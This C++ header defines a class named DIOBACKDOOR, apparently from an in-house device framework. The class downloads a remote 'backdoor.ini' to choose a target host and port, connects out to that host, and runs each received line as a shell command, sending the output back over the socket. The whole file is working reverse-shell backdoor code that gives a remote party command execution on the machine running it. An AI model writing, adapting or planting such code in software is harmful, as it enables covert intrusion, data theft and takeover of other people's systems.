/*------------------------------------------------------------------------------------------
// DIOSSHReverse.HPP
*/
/**
// \class
//
//  DIO SSH reverse connexions (Linux)
//
//  @author: No se ha podido abrir el fichero de author
//
//  Date of Creation : 06/12/2017 10:35:30
//  Last Modification :
*/
/*  GEN  Copyright (C).  All right reserved.
/*------------------------------------------------------------------------------------------*/


#ifndef _DIOBACKDOOR_HPP
#define _DIOBACKDOOR_HPP

/*---- INCLUDES --------------------------------------------------------------------------*/

#include "XFactory.h"
#include "XPathsManager.h"
#include "XString.h"
#include "XSystem.h"
#include "XFile.h"
#include "XFileINI.h"
#include "XSleep.h"
#include "XThreadCollected.h"
#include "XDebug.h"

#include "DIOFactory.h"
#include "DIOURL.h"
#include "DIOStreamTCPIP.h"
#include "DIOStreamTCPIPConfig.h"
#include "DIOWebClient.h"


/*---- DEFINES & ENUMS  ------------------------------------------------------------------*/

#define DIOBACKDOOR_CFGREMOTENAMEFILE       __L("backdoor.ini")
#define DIOBACKDOOR_DEFAULTPORT             3540


/*---- CLASS -----------------------------------------------------------------------------*/

class DIOBACKDOOR
{
  public:

    static bool                     GetIsInstanced      ()
                                    {
                                      return instance!=NULL;
                                    }

    static DIOBACKDOOR&             GetInstance         ()
                                    {
                                      if(!instance) instance = new DIOBACKDOOR();

                                      return (*instance);
                                    }

    static bool                     DelInstance         ()
                                    {
                                      if(instance)
                                        {
                                          delete instance;
                                          instance = NULL;

                                          return true;
                                        }

                                      return false;
                                    }


    XSTRING*                      GetURLTarget          ()                                                { return &URLtarget;                                            }
    XDWORD                        GetPort               ()                                                { return port;                                                  }
    void                          SetPort               (XDWORD port)                                     { this->port = port;                                            }

    bool                          DownloadCFG           (XCHAR* URL, XSTRING& publicIP, XSTRING& localIP)
                                  {
                                    if(!URL)   return false;

                                    XBUFFER xbuffer;
                                    DIOURL  _URL;
                                    bool    status  = false;
                                    bool    result  = false;

                                    DIOWEBCLIENT* webclient = new DIOWEBCLIENT();
                                    if(!webclient)  return false;

                                    _URL.Set(URL);
                                    _URL.Slash_Add();
                                    _URL.Add(DIOBACKDOOR_CFGREMOTENAMEFILE);

                                    status = webclient->Get(_URL, xbuffer, NULL, 3);
                                    if(status)
                                      {
                                        XFILEINI* fileini = new XFILEINI();
                                        if(fileini)
                                          {
                                            status = fileini->AddBufferLines(XFILETXTFORMATCHAR_ASCII, xbuffer);
                                            if(status)
                                              {
                                                status = fileini->ConvertFromLines();
                                                if(status)
                                                  {
                                                    int c = 1;
                                                    while(1)
                                                      {
                                                        XSTRING section;
                                                        XSTRING value;

                                                        section.Format(__L("ENTRY%02d"), c);

                                                        if(!fileini->SelectSection(section)) break;

                                                        status = fileini->ReadValue(__L("isactive"), value);
                                                        if(status)
                                                          {
                                                            if(!value.Compare(__L("yes"), true))
                                                              {
                                                                DIOURL* urlorigin = diofactory->CreateURL();
                                                                if(urlorigin)
                                                                  {
                                                                    XSTRING _publicIP;
                                                                    XSTRING _localIP;

                                                                    status = fileini->ReadValue(__L("urlorigin"), (*urlorigin));
                                                                    if(status)
                                                                      {
                                                                        bool validaccess = false;

                                                                        urlorigin->ResolveURL(_publicIP);

                                                                        if(!publicIP.Compare(_publicIP))
                                                                          {
                                                                            validaccess = true;

                                                                            status = fileini->ReadValue(__L("localip"), _localIP);
                                                                            if(status)
                                                                              {
                                                                                if(_localIP.GetSize())
                                                                                  {
                                                                                    if(_localIP.Compare(localIP)) validaccess = false;
                                                                                  }
                                                                              }
                                                                          }


                                                                        if(validaccess)
                                                                          {

                                                                            status = fileini->ReadValue(__L("urltarget"), value);
                                                                            if(status) GetURLTarget()->Set(value);

                                                                            status = fileini->ReadValue(__L("port"), value);
                                                                            if(status) SetPort(value.ConvertToInt());

                                                                            result = true;
                                                                          }
                                                                      }

                                                                    diofactory->DeleteURL(urlorigin);
                                                                  }
                                                              }
                                                          }

                                                        c++;
                                                      }
                                                  }
                                              }

                                            delete fileini;
                                          }
                                      }

                                    delete webclient;

                                    return result;
                                  }

    bool                          DownloadCFG           (XSTRING& URL, XSTRING& publicIP, XSTRING& localIP)
                                  {
                                    return DownloadCFG(URL.Get(), publicIP, localIP);
                                  }

    bool                          DownloadCFG           (DIOURL&  URL, XSTRING& publicIP, XSTRING& localIP)
                                  {
                                    return DownloadCFG(URL.Get(), publicIP, localIP);
                                  }

    bool                          ActivateServer        (DIOSTREAMMODE mode = DIOSTREAMMODE_CLIENT)
                                  {
                                    DeActivateServer();

                                    diostreamcfg.SetMode(mode);
                                    diostreamcfg.GetRemoteURL()->Set(URLtarget.Get());
                                    diostreamcfg.SetRemotePort(port);

                                    diostream = diofactory->CreateStreamIO(&diostreamcfg);
                                    if(!diostream) return false;

                                    if(!diostream->Open())             return false;

                                    if((mode == DIOSTREAMMODE_CLIENT) ||  (mode == DIOSTREAMMODE_SLAVE))
                                      {
                                        if(!diostream->WaitToConnected(10)) return false;
                                      }

                                    xthreadconnexion = CREATEXTHREAD(XTHREADGROUPID_UNGROUP,__L("DIOBACKDOOR::DIOBACKDOOR"), ThreadRunFunction, (void*)this);
                                    if(xthreadconnexion) xthreadconnexion->Ini();

                                    return true;
                                  }


    bool                          DeActivateServer      ()
                                  {

                                    bool    status     = false;

                                    if(IsRunning())
                                      {
                                        diostream->Close();
                                        diofactory->DeleteStreamIO(diostream);
                                        diostream = NULL;
                                      }

                                    if(xthreadconnexion)
                                      {
                                        xthreadconnexion->End();
                                        DELETEXTHREAD(XTHREADGROUPID_UNGROUP, xthreadconnexion);

                                        xthreadconnexion = NULL;
                                      }

                                    return status;
                                  }


    bool                          IsRunning             ()
                                  {
                                    bool status = false;

                                    if(!diostream) return status;

                                    return diostream->IsConnected();
                                  }



  private:
                                  DIOBACKDOOR           ()
                                  {
                                    Clean();
                                  }

                                  DIOBACKDOOR           (DIOBACKDOOR const&);     // Don't implement

    virtual                      ~DIOBACKDOOR           ()
                                  {
                                    Clean();
                                  }

    void                          operator =            (DIOBACKDOOR const&);     // Don't implement

    void                          Clean                 ()
                                  {
                                    diostream        = NULL;                                    

                                    URLtarget.Empty();
                                    port             = DIOBACKDOOR_DEFAULTPORT;

                                    xthreadconnexion = NULL;
                                    commandreceived.Empty();
                                  }

    bool                          ReceivedCommand       ()
                                  {
                                    if(!diostream)                return false;
                                    if(!diostream->IsConnected()) return false;

                                    XDWORD size  = diostream->GetInXBuffer()->GetSize();
                                    if(!size) return false;

                                    bool endline   = false;

                                    for(XDWORD c=0; c<size; c++)
                                      {
                                        char character = 0;

                                        if(diostream->Read((XBYTE*)&character, 1))
                                          {
                                            if((character == '\n') || (character == '\r'))
                                              {
                                                endline = true;

                                                if(diostream->GetInXBuffer()->GetSize())
                                                  {
                                                    character = diostream->GetInXBuffer()->GetByte(0);
                                                    if((character == '\n') || (character == '\r'))
                                                      {
                                                        if(diostream->Read((XBYTE*)&character, 1))
                                                          {

                                                          }
                                                      }
                                                  }
                                              }
                                          }

                                        if(endline) return true;

                                        if((character >= 0x20) && (character < 0x80)) commandreceived.Add(character);
                                      }

                                    return false;
                                  }

  static void                     ThreadRunFunction     (void* param)
                                  {
                                    DIOBACKDOOR* backdoor  = (DIOBACKDOOR*)param;
                                    if(!backdoor) return;

                                    if(backdoor->ReceivedCommand())
                                      {
                                        XSYSTEM* xsystem = xfactory->CreateSystem();
                                        if(xsystem)
                                          {
                                            XPATH xpath;

                                            XPATHSMANAGER::GetInstance().GetPathOfSection(XPATHSMANAGERSECTIONTYPE_ROOT, xpath);
                                            xpath.Slash_Add();
                                            xpath.Add(__L("backscreen"));

                                            XSTRING command;
                                            int     returncode = 0;

                                            command.Format(__L("%s > %s"), backdoor->commandreceived.Get(), xpath.Get());

                                            if(xsystem->MakeCommand(command.Get(), &returncode))
                                              {
                                                XFILETXT* xfiletxt = new XFILETXT();
                                                if(xfiletxt)
                                                  {
                                                    if(xfiletxt->Open(xpath, true))
                                                      {
                                                        if(xfiletxt->ReadAllFile())
                                                          {
                                                            for(int c=0; c<xfiletxt->GetNLines(); c++)
                                                              {
                                                                XSTRING string = xfiletxt->GetLine(c)->Get();

                                                                string.Add(__L("\n\r"));

                                                                XSTRING_CREATEOEM(string, line)
                                                                backdoor->diostream->Write((XBYTE*)line, string.GetSize());
                                                                XSTRING_DELETEOEM(line)
                                                              }
                                                          }

                                                        xfiletxt->Close();
                                                      }

                                                    xfiletxt->GetPrimaryFile()->Erase(xpath);
                                                  }

                                                delete xfiletxt;
                                             }

                                            backdoor->commandreceived.Empty();
                                          }
                                      }
                                  }

    DIOSTREAMTCPIPCONFIG          diostreamcfg;
    DIOSTREAM*                    diostream;

    XSTRING                       URLtarget;
    XDWORD                        port;

    static DIOBACKDOOR*           instance;

    XTHREADCOLLECTED*             xthreadconnexion;
    XSTRING                       commandreceived;

};

/*---- INLINE FUNCTIONS ------------------------------------------------------------------*/

DIOBACKDOOR*   DIOBACKDOOR::instance = NULL;

#endif